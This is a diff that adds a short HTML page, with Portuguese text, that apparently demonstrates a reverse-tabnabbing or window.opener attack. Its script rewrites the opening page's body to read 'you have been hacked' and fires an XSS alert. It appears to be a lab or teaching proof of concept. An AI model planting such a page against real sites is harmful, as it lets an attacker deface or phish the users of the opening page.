@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>Você caiu</h1>
+    <script>
+      try {
+        // altera
+        window.opener.document.body.innerHTML = `<h1>Você foi invadido!</h1><script>alert('XSS via window.opener')</script>`;
+      } catch (e) {
+        alert("Falha ao acessar opener: " + e);
+      }
+    </script>
+  </body>
+</html>
